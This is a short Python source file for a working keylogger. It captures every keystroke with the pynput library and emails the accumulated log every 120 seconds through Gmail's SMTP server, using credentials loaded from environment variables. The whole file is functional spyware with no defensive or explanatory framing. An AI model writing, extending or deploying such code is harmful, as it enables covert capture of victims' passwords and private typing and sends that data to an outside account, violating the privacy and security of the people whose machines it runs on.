import pynput.keyboard  # type: ignore
import threading
import smtplib
import dotenv
import os


class Keylogger:

    def __init__(self, time_interval, email, password) -> None:
        self.interval: int = time_interval
        self.email: str = email
        self.password: str = password
        self.log: str = ""

    def append_to_log(self, string) -> None:
        self.log += string

    def process_key_press(self, key) -> None:
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = f" {str(key)} "
        self.append_to_log(current_key)

    def report(self) -> None:
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, message) -> None:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self) -> None:
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


def main() -> None:
    dotenv.load_dotenv()
    EMAIL = os.getenv('EMAIL')
    PASSWORD = os.getenv('PASSWORD')
    keylogger = Keylogger(120, EMAIL, PASSWORD)
    keylogger.start()


if __name__ == "__main__":
    main()
